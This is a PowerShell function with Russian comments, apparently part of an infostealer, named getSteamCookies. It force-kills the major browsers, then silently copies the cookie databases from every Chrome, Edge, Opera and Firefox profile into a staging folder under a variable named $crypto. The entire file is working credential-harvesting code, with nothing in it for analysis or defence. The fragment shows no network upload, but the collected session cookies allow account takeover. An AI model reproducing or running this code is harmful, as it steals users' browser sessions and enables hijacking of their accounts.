function getSteamCookies {
    # --- ЖЁСТКОЕ ЗАВЕРШЕНИЕ БРАУЗЕРОВ ---
    $browserExes = @("chrome.exe", "msedge.exe", "opera.exe", "firefox.exe")
    foreach ($exe in $browserExes) {
        taskkill /F /IM $exe /T 2>$null
    }
    Start-Sleep -Seconds 2   # даём время на освобождение файлов
    # ---

    $cookieFolder = "$crypto\BrowserCookies"
    New-Item -ItemType Directory -Path $cookieFolder -Force | Out-Null

    # 1. Chrome (все профили)
    $chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $chromeUserData) {
        $profiles = Get-ChildItem -Path $chromeUserData -Directory
        foreach ($profile in $profiles) {
            $cookieFile = Join-Path $profile.FullName "Cookies"
            if (Test-Path $cookieFile) { 
                Copy-Item $cookieFile -Destination "$cookieFolder\Chrome_$($profile.Name).Cookies" -Force -ErrorAction SilentlyContinue
            }
            $networkCookie = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $networkCookie) { 
                Copy-Item $networkCookie -Destination "$cookieFolder\Chrome_$($profile.Name)_Network.Cookies" -Force -ErrorAction SilentlyContinue
            }
        }
    }

    # 2. Edge (все профили)
    $edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $edgeUserData) {
        $profiles = Get-ChildItem -Path $edgeUserData -Directory
        foreach ($profile in $profiles) {
            $cookieFile = Join-Path $profile.FullName "Cookies"
            if (Test-Path $cookieFile) { 
                Copy-Item $cookieFile -Destination "$cookieFolder\Edge_$($profile.Name).Cookies" -Force -ErrorAction SilentlyContinue
            }
            $networkCookie = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $networkCookie) { 
                Copy-Item $networkCookie -Destination "$cookieFolder\Edge_$($profile.Name)_Network.Cookies" -Force -ErrorAction SilentlyContinue
            }
        }
    }

    # 3. Opera (один профиль)
    $operaPaths = @(
        "$env:APPDATA\Opera Software\Opera Stable\Cookies",
        "$env:APPDATA\Opera Software\Opera GX Stable\Cookies"
    )
    foreach ($path in $operaPaths) {
        if (Test-Path $path) {
            $name = Split-Path -Path $path -Parent | Split-Path -Leaf
            Copy-Item $path -Destination "$cookieFolder\Opera_$name.Cookies" -Force -ErrorAction SilentlyContinue
        }
    }

    # 4. Firefox (все файлы cookies*)
    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $cookieFiles = Get-ChildItem -Path $profile.FullName -Filter "cookies*" -File -ErrorAction SilentlyContinue
        foreach ($cf in $cookieFiles) {
            Copy-Item $cf.FullName -Destination "$cookieFolder\Firefox_$($profile.Name)_$($cf.Name)" -Force -ErrorAction SilentlyContinue
        }
    }
}
